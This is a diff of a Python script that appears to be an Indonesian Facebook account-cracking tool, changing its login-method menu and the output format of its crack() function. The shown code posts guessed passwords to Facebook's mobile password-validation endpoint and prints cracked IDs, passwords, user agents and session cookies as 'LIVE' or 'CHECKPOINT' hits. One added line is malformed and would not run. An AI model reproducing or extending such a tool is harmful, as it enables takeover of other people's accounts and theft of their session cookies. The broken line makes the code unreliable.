@@ -540,7 +540,9 @@ def setting():
 		exit()
 	met = '# METHODE LOGIN FACEBOOK'
 	sol().print(mark(met, style='red'))
-	ioz = '[bold red][[bold white]01[bold red]][bold black] MOBILE FACEBOOK [bold red][[bold green]Slow[bold red]]\n[bold red][[bold white]02[bold red]][bold black] TOUCH FACEBOOK [bold red][[bold green]Fast[bold red]]\n[bold red][[bold white]03[bold red]][bold black] MBASIC FACEBOOK [bold red][[bold green]Normal[bold red]]'
+	ioz = '[bold red][[bold white]01[bold red]][bold black] MOBILE FACEBOOK [bold red][[bold green]Slow[bold red]]'
+	#	[bold red][[bold white]02[bold red]][bold black] TOUCH FACEBOOK [bold red][[bold green]Fast[bold red]]\n
+	#	[bold red][[bold white]03[bold red]][bold black] MBASIC FACEBOOK [bold red][[bold green]Normal[bold red]]'
 	gess = nel(ioz, style='black')
 	panjihitam(nel(gess, title='[bold red][[bold white]LOGIN FACEBOOK MELALUI[bold red]]'))
 	hc = input(N+'['+M+'➣'+N+'] PILIH LOGIN : ')
@@ -647,7 +649,7 @@ def crack(idf,pwv,nmf):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print('\n')
-				cpngab = f'[➣] NAMA : {nmf}\n[➣] ID FACEBOOK : {idf}\n[➣] PASSWORD : {pw}'
+				cpngab = f'[➣] ID  : {idf}\n[➣] PW  : {pw}\n[➣]  UA  :{ua}'
 				cpgan = nel(cpngab, style='yellow')
 				panjihitam(nel(cpgan, title='[bold red][[bold yellow]CHECKPOINT[bold red]]'))
 				os.popen('play-audio data/cp.mp3')
@@ -660,7 +662,7 @@ def crack(idf,pwv,nmf):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print('\n')
-				okengab = f'[➣] NAMA : {nmf}\n[➣] ID FACEBOOK : {idf}\n[➣] PASSWORD : {pw}\n[➣] COOKIES  : {kuki}'
+				okengab = f'f'[➣] ID  : {idf}\n[➣] PW  : {pw}'\n[➣] COOKIES  : {kuki}'
 				okegan = nel(okengab, style='green')
 				panjihitam(nel(okegan, title='[bold red][[bold green]LIVE - OK[bold red]]'))
 				os.popen('play-audio data/ok.mp3')
